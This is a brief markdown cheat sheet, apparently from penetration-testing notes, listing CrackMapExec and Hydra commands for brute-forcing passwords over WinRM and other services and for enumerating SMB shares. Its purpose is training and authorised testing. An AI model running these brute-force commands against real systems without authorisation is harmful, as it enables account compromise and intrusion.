### Remote Password Attacks

| **Command**| **Description**|
|-|-|
| `crackmapexec winrm <ip> -u user.list -p password.list` | Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target. |
| `crackmapexec smb <ip> -u "user" -p "password" --shares` | Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials. |
| `hydra -L user.list -P password.list <service>://<ip>`       | Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service. |
| `hydra -l username -P password.list <service>://<ip>`       | Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service. |
| `hydra -l user.list -p password <service>://<ip>`       | Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service. |
